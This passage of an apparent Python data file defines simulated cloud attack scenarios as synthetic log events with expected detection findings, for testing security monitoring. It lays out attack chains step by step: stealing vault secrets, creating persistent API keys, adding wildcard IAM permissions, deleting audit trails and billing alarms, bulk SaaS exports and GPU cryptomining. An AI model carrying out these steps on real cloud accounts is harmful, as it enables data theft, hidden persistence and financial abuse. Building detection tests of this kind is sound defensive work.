        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Azure Key Vault", "action": "list_secrets", "usage": "read", "resource_type": "key_vault", "resource_name": "corp-prod-keyvault", "success": True, "description": "Enumerated all secrets in production vault", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 8), data={"app": "Azure Key Vault", "action": "list_keys", "usage": "read", "resource_type": "key_vault", "resource_name": "corp-prod-keyvault", "success": True, "description": "Enumerated cryptographic keys in production vault", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 3: Credential access — read high-value secrets
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Azure Key Vault", "action": "get_secret_value", "usage": "read", "resource_type": "key_vault", "resource_name": "prod-db-password", "success": True, "description": "Retrieved production database password", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 6), data={"app": "Azure Key Vault", "action": "get_secret_value", "usage": "read", "resource_type": "key_vault", "resource_name": "stripe-api-key", "success": True, "description": "Retrieved Stripe payment API key", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 6), data={"app": "Azure Key Vault", "action": "get_secret_value", "usage": "read", "resource_type": "key_vault", "resource_name": "smtp-service-credentials", "success": True, "description": "Retrieved SMTP service account credentials", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 6), data={"app": "Azure Key Vault", "action": "get_certificate", "usage": "read", "resource_type": "key_vault", "resource_name": "prod-tls-private-key", "success": True, "description": "Downloaded production TLS private key", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        # Phase 4: Lateral movement — pivot using stolen credentials
        AttackEvent(event_type="login", delay=_delay(15, 8, 3, 45), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "python-requests/2.28.0", "method": "api_key", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "AWS RDS Console", "action": "connect_database", "usage": "read", "resource_type": "database", "resource_name": "prod-customers-db", "success": True, "description": "Connected to production database using stolen password", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "AWS RDS Console", "action": "execute_query", "usage": "read", "resource_type": "database", "resource_name": "prod-customers-db", "success": True, "description": "Queried customer records table via stolen credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/exports/customers_dump.csv", "system": "s3", "label": "confidential", "category": "pii", "description": "Exported customer database records to S3 and downloaded", "metadata": {"attack_phase": "exfiltration"}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.75,
    iocs=[],
    expected_findings=["Key vault enumeration from unknown device", "Multiple secrets read in rapid succession", "Production database accessed with stolen credentials"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

NEW_API_KEYS_PERSISTENCE = AttackScenario(
    id="new_api_keys_persistence",
    tier="T3",
    name="Cloud API Key Creation for Persistence",
    description="Attacker with compromised cloud console access performs multi-day API key persistence campaign. Day 1: enumerates IAM users, roles, and service accounts, reviews CloudTrail configuration, identifies service account with production privileges, creates persistent API keys and verifies them. Day 2-3: returns using API keys (independent of password/MFA), enumerates cloud resources across S3, RDS, Lambda, and Secrets Manager, accesses production customer data and financial reports, downloads database snapshots, retrieves application secrets, and exfiltrates data in bulk.",
    attack_type="persistence",
    events=[
        # =====================================================================
        # DAY 1 — Initial access + IAM recon + create persistent API keys
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: IAM reconnaissance — find service accounts with production access ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "IAM Console", "action": "list_users", "resource_type": "iam_user", "resource_name": "All IAM Users", "success": True, "description": "Enumerated all IAM users — identified service accounts and their last-used dates", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "IAM Console", "action": "list_roles", "resource_type": "iam_role", "resource_name": "All IAM Roles", "success": True, "description": "Enumerated IAM roles — identified cross-account and service-linked roles", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "IAM Console", "action": "list_attached_policies", "resource_type": "iam_policy", "resource_id": "svc-deploy-prod", "resource_name": "svc-deploy-prod — Attached Policies", "success": True, "description": "Reviewed policies attached to svc-deploy-prod — has S3, RDS, and EC2 production access", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "IAM Console", "action": "list_access_keys", "resource_type": "access_key", "resource_id": "svc-deploy-prod", "resource_name": "svc-deploy-prod — Access Keys", "success": True, "description": "Checked existing access keys for svc-deploy-prod — one active key found, room for second", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Check CloudTrail configuration ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "AWS CloudTrail", "action": "describe_trails", "resource_type": "trail", "resource_name": "All CloudTrail Trails", "success": True, "description": "Enumerated CloudTrail trails — identified logging configuration and S3 log destinations", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Create persistent API keys ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "IAM Console", "action": "create_access_key", "resource_type": "access_key", "resource_id": "AKIA3EXAMPLE1234ABCD", "resource_name": "svc-deploy-prod", "success": True, "description": "New programmatic access key created for svc-deploy-prod", "metadata": {"attack_phase": "persistence", "is_attacker": True, "api_key_created": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 5), data={"app": "AWS CLI", "action": "get_caller_identity", "resource_type": "identity", "resource_name": "sts:GetCallerIdentity", "success": True, "description": "New access key verified via STS — confirmed as svc-deploy-prod", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 2-3 — Attacker returns using only the API key
        # (1-2 day gap: password may have been rotated, but API key persists)
        # =====================================================================

        # --- Phase 5: Attacker returns with persistent API key ---
        AttackEvent(event_type="login", delay=_delay(2160, 720, 1080, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "aws-cli/2.13.0 Python/3.11.4", "method": "api_key", "metadata": {"attack_phase": "persistence", "is_attacker": True, "return_session": True, "persistent_key_reuse": True}}, requires_success=True),

        # --- Phase 6: Cloud resource enumeration ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS S3", "action": "list_buckets", "resource_type": "bucket", "resource_name": "All S3 Buckets", "success": True, "description": "Listed all S3 buckets — identified prod-customer-data, prod-financial-reports, and prod-backups", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS RDS", "action": "describe_db_instances", "resource_type": "database", "resource_name": "All RDS Instances", "success": True, "description": "Enumerated RDS instances — found production database cluster prod-main-cluster", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "AWS Lambda", "action": "list_functions", "resource_type": "function", "resource_name": "All Lambda Functions", "success": True, "description": "Enumerated Lambda functions — identified payment-processor, data-pipeline, and report-generator", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Access Secrets Manager ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "AWS Secrets Manager", "action": "list_secrets", "resource_type": "secret", "resource_name": "All Secrets", "success": True, "description": "Listed all secrets — found prod/db-credentials, prod/api-keys, and prod/stripe-keys", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "AWS Secrets Manager", "action": "get_secret_value", "resource_type": "secret", "resource_id": "prod/db-credentials", "resource_name": "prod/db-credentials", "success": True, "description": "Retrieved production database credentials from Secrets Manager", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Access production data — S3 ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "AWS S3", "action": "list_objects", "resource_type": "object", "resource_id": "prod-customer-data", "resource_name": "prod-customer-data/*", "success": True, "description": "Listed objects in prod-customer-data bucket — 2,400 objects found", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS S3", "action": "get_object", "resource_type": "object", "resource_id": "prod-customer-data/exports/customer-pii-full-2026.csv.gz", "resource_name": "customer-pii-full-2026.csv.gz", "success": True, "description": "Downloaded full customer PII export from production S3 bucket", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "AWS S3", "action": "get_object", "resource_type": "object", "resource_id": "prod-financial-reports/2026-Q3-earnings-preview.xlsx", "resource_name": "2026-Q3-earnings-preview.xlsx", "success": True, "description": "Downloaded pre-release earnings report from production financial bucket", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: Create RDS snapshot for bulk data exfil ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "AWS RDS", "action": "create_db_snapshot", "resource_type": "snapshot", "resource_id": "manual-export-20260423", "resource_name": "prod-main-cluster Snapshot", "success": True, "description": "Created manual snapshot of production RDS cluster for bulk data access", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 10: Share RDS snapshot to external account for exfil ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS RDS", "action": "modify_db_snapshot_attribute", "resource_type": "snapshot", "resource_id": "manual-export-20260423", "resource_name": "prod-main-cluster Snapshot — Shared", "success": True, "description": "Shared RDS snapshot with external AWS account for cross-account data exfiltration", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "cross_account_share": True}}, requires_success=True),

        # --- Phase 11: Exfiltration ---
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "svc-deploy-prod", "auth": "none", "bytes_sent": 52428800, "bytes_received": 2048, "description": "S3 data downloaded to external IP via AWS CLI — 50 MB of production customer and financial data"}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.75,
    iocs=[],
    expected_findings=[
        "New access key created for service account and verified via STS",
        "API key login days later — persistent access independent of password",
        "Secrets Manager accessed — production credentials retrieved",
        "RDS snapshot created and shared with external AWS account",
        "Production data exfiltrated via stolen service account credentials",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

ROLE_POLICY_TAMPERING = AttackScenario(
    id="role_policy_tampering",
    tier="T2",
    name="IAM Role / Policy Tampering for Privilege Escalation",
    description="Attacker with compromised cloud credentials performs IAM reconnaissance to understand existing policies, inspects policy documents before modification, modifies IAM policy to add wildcard permissions and attaches to their identity. Post-modification the attacker accesses resources across multiple services, collects data, and exfiltrates via S3.",
    attack_type="privilege_escalation",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # --- Phase 2: IAM reconnaissance ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "IAM Console", "action": "list_policies", "resource_name": "All IAM Policies", "success": True, "description": "Enumerated all IAM policies attached to users and roles", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "IAM Console", "action": "get_policy_version", "resource_name": "corp-prod-iam-policy", "success": True, "description": "Retrieved current policy document — reviewed existing permission boundaries", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 6), data={"app": "IAM Console", "action": "list_attached_policies", "resource_name": "svc-automation-user", "success": True, "description": "Listed policies on svc-automation-user — identified as escalation target", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 3: Policy modification ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 20), data={"app": "IAM Console", "action": "put_role_policy", "resource_name": "corp-prod-iam-policy", "success": True, "description": "IAM policy modified — added Action: *, Resource: * wildcard permissions", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 5), data={"app": "IAM Console", "action": "attach_user_policy", "resource_name": "svc-automation-user", "success": True, "description": "Tampered policy attached to svc-automation-user identity", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),
        # --- Phase 4: Post-modification resource access ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "AWS RDS", "action": "access_resource", "resource_name": "prod-finance-db", "success": True, "description": "Production finance database accessed with elevated permissions", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "AWS S3", "action": "list_objects", "resource_name": "corp-restricted-data/*", "success": True, "description": "Listed objects in previously restricted S3 bucket", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "AWS Secrets Manager", "action": "get_secret_value", "resource_name": "prod/database/master-password", "success": True, "description": "Retrieved production database master password", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        # --- Phase 5: Data collection and exfil ---
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 12), data={"action": "download", "path": "/restricted/payroll_q4.xlsx", "system": "s3", "label": "confidential", "category": "financial", "description": "Payroll data downloaded from restricted bucket", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(2, 1, 0.3, 8), data={"action": "download", "path": "/restricted/customer_pii_export.csv.gz", "system": "s3", "label": "confidential", "category": "pii", "description": "Customer PII export downloaded from restricted bucket", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        # --- Phase 6: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "svc-automation-user", "auth": "none", "bytes_sent": 104857600, "bytes_received": 2048, "description": "100 MB outbound transfer — payroll and customer PII exfiltrated via tampered IAM policy"}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.7,
    iocs=[],
    expected_findings=["IAM policy modified with wildcard permissions", "Tampered policy attached to attacker identity", "Production database accessed with elevated permissions", "Customer PII data downloaded"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

LOGGING_AUDIT_SUPPRESSION = AttackScenario(
    id="logging_audit_suppression",
    tier="T2",
    name="Cloud Logging / Audit Trail Suppression",
    description="Attacker enumerates cloud logging infrastructure, systematically disables trails, sinks, and alerts, then exfiltrates data under reduced visibility.",
    attack_type="defense_evasion",
    events=[
        # Phase 1: Initial access
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # Phase 2: Reconnaissance — enumerate logging infrastructure
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "CloudTrail Console", "action": "describe_trails", "usage": "read", "resource_type": "logging", "resource_name": "all-trails", "success": True, "description": "Enumerated all CloudTrail trails and their configurations", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "CloudWatch Console", "action": "list_log_groups", "usage": "read", "resource_type": "logging", "resource_name": "all-log-groups", "success": True, "description": "Listed CloudWatch log groups and retention settings", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "CloudWatch Console", "action": "describe_alarms", "usage": "read", "resource_type": "monitoring", "resource_name": "security-alarms", "success": True, "description": "Enumerated CloudWatch security alarm configurations", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "Cloud Logging Console", "action": "list_sinks", "usage": "read", "resource_type": "logging", "resource_name": "all-sinks", "success": True, "description": "Listed log export sinks and destinations", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 3: Defense evasion — systematically disable logging
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 25), data={"app": "CloudTrail Console", "action": "stop_logging", "usage": "admin", "resource_type": "logging", "resource_name": "corp-prod-trail", "success": True, "description": "CloudTrail logging disabled on primary production trail", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "CloudTrail Console", "action": "delete_trail", "usage": "admin", "resource_type": "logging", "resource_name": "security-audit-trail", "success": True, "description": "Secondary security audit trail deleted", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Cloud Logging Console", "action": "delete_log_sink", "usage": "admin", "resource_type": "logging", "resource_name": "corp-audit-log-sink", "success": True, "description": "Log export sink deleted", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "CloudWatch Console", "action": "disable_alarm", "usage": "admin", "resource_type": "monitoring", "resource_name": "UnauthorizedAPICall-Alert", "success": True, "description": "Unauthorized API call alert disabled", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "CloudWatch Console", "action": "delete_log_group", "usage": "admin", "resource_type": "logging", "resource_name": "/aws/cloudtrail/management-events", "success": True, "description": "CloudWatch log group for management events deleted", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
        # Phase 4: Validation — confirm logging is down
        AttackEvent(event_type="app_event", delay=_delay(6, 3, 1, 18), data={"app": "CloudTrail Console", "action": "get_trail_status", "usage": "read", "resource_type": "logging", "resource_name": "corp-prod-trail", "success": True, "description": "Verified CloudTrail logging is stopped", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
        # Phase 5: Exfiltration under reduced visibility
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "S3 Console", "action": "list_objects", "usage": "read", "resource_type": "storage", "resource_name": "corp-sensitive-data-bucket", "success": True, "description": "Enumerated objects in sensitive data bucket", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/sensitive/customer_records.csv", "system": "s3", "label": "confidential", "category": "pii", "description": "Customer PII records downloaded from S3", "metadata": {"attack_phase": "exfiltration"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/sensitive/financial_reports_2024.xlsx", "system": "s3", "label": "confidential", "category": "financial", "description": "Financial reports downloaded from S3", "metadata": {"attack_phase": "exfiltration"}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.7,
    iocs=[],
    expected_findings=["CloudTrail disabled", "Audit trail and log sinks deleted", "Security alerts disabled", "Data exfiltrated during reduced logging"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

SAAS_BULK_EXPORT = AttackScenario(
    id="saas_bulk_export",
    tier="T2",
    name="SaaS Platform Bulk Data Export",
    description="Attacker with compromised admin credentials discovers available export options, initiates multiple export jobs (mailbox, SharePoint, Teams chat), monitors export job status, downloads multiple export files, and transfers them externally over HTTPS.",
    attack_type="data_exfiltration",
    events=[
        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # --- Phase 2: Discovery ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Microsoft Purview", "action": "access_compliance_portal", "resource_name": "Compliance Portal Dashboard", "success": True, "description": "Accessed compliance portal and reviewed available export tools", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 8), data={"app": "Microsoft Purview", "action": "list_content_searches", "resource_name": "Existing Content Searches", "success": True, "description": "Listed existing content searches to understand export patterns", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 3: Multiple export jobs ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 20), data={"app": "Microsoft 365", "action": "initiate_mailbox_export", "resource_name": "full-mailbox-export", "success": True, "description": "Mailbox export job initiated — all mailboxes", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 12), data={"app": "Microsoft 365", "action": "initiate_file_export", "resource_name": "sharepoint-full-export", "success": True, "description": "SharePoint document library export initiated", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 12), data={"app": "Microsoft 365", "action": "initiate_chat_export", "resource_name": "teams-chat-export", "success": True, "description": "Teams chat and channel message export initiated", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 4: Export job status checks ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 60), data={"app": "Microsoft Purview", "action": "check_export_status", "resource_name": "full-mailbox-export", "success": True, "description": "Checked mailbox export job status — 85% complete", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Microsoft Purview", "action": "check_export_status", "resource_name": "sharepoint-full-export", "success": True, "description": "Checked SharePoint export job status — completed", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        # --- Phase 5: Multiple file downloads ---
        AttackEvent(event_type="file_event", delay=_delay(30, 15, 5, 120), data={"action": "download", "path": "/exports/corporate_mail_export.pst", "system": "purview", "description": "Downloaded mailbox export PST — 3.2 GB", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(15, 8, 3, 60), data={"action": "download", "path": "/exports/sharepoint_document_export.zip", "system": "purview", "description": "Downloaded SharePoint document export — 800 MB", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 30), data={"action": "download", "path": "/exports/teams_chat_export.zip", "system": "purview", "description": "Downloaded Teams chat export — 200 MB", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        # --- Phase 6: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 20), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "bytes_sent": 4509715660, "bytes_received": 1024, "description": "4.2 GB outbound transfer — mailbox PST, SharePoint docs, and Teams chats exported", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_CLOUD_BASE_PARAMS,
    success_rate=0.7,
    iocs=[],
    expected_findings=["Admin-initiated bulk export from suspicious IP", "Mailbox, SharePoint, and Teams export jobs initiated", "Large outbound data transfer to external IP"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

CLOUD_CRYPTOMINING = AttackScenario(
    id="cloud_cryptomining",
    tier="T3",
    name="Cloud Infrastructure Cryptomining Abuse",
    description="Attacker with compromised cloud credentials performs multi-day cryptomining campaign. Day 1: enumerates GPU instance types, checks service quotas across regions, reviews spot pricing for cost-efficient mining, disables CloudTrail logging, suppresses billing alarms and budgets, provisions GPU instances across multiple regions, deploys XMRig mining containers, and verifies mining pool connectivity. Day 3: returns to verify operation stability, requests quota increases, scales up with additional instances in new regions, and deploys to spot instances. Day 5-6: billing anomaly finally detected after $47K+ in compute costs.",
    attack_type="impact",
    events=[
        # =====================================================================
        # DAY 1 — Initial access + recon + alert suppression + deploy miners
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Enumerate resources, quotas, and pricing ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "AWS EC2 Console", "action": "describe_instance_types", "resource_type": "instance_type", "resource_name": "GPU Instance Types", "success": True, "description": "Enumerated available GPU instance types — p3.16xlarge and g5.12xlarge available", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "AWS Service Quotas", "action": "get_service_quota", "resource_type": "quota", "resource_name": "EC2 GPU Instance Limit", "success": True, "description": "Checked GPU instance quota — limit of 8 per region across us-east-1, us-west-2, eu-west-1", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "AWS EC2 Console", "action": "describe_spot_price_history", "resource_type": "pricing", "resource_name": "GPU Spot Pricing — Last 7 Days", "success": True, "description": "Reviewed spot instance pricing for GPU types — p3.16xlarge spot at ~60% discount vs on-demand", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Suppress CloudTrail logging ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "AWS CloudTrail", "action": "stop_logging", "resource_type": "trail", "resource_name": "management-events-trail", "success": True, "description": "Stopped CloudTrail logging on management events trail to suppress API activity records", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Suppress billing alerts ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "AWS CloudWatch", "action": "delete_alarms", "resource_type": "alarm", "resource_name": "BillingAlarm-Monthly-Threshold", "success": True, "description": "Deleted monthly billing threshold alarm to suppress cost alerts", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "AWS Budgets", "action": "delete_budget", "resource_type": "budget", "resource_name": "Monthly-Compute-Budget", "success": True, "description": "Deleted monthly compute budget and associated notifications", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Provision GPU instances across regions ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "AWS EC2 Console", "action": "run_instances", "resource_type": "instance", "resource_id": "i-0abc111222333", "resource_name": "4x p3.16xlarge (us-east-1)", "success": True, "description": "4 GPU instances (p3.16xlarge) launched in us-east-1", "metadata": {"attack_phase": "resource_development", "is_attacker": True, "region": "us-east-1"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS EC2 Console", "action": "run_instances", "resource_type": "instance", "resource_id": "i-0abc444555666", "resource_name": "4x p3.16xlarge (us-west-2)", "success": True, "description": "4 GPU instances (p3.16xlarge) launched in us-west-2", "metadata": {"attack_phase": "resource_development", "is_attacker": True, "region": "us-west-2"}}, requires_success=True),

        # --- Phase 6: Deploy mining containers ---
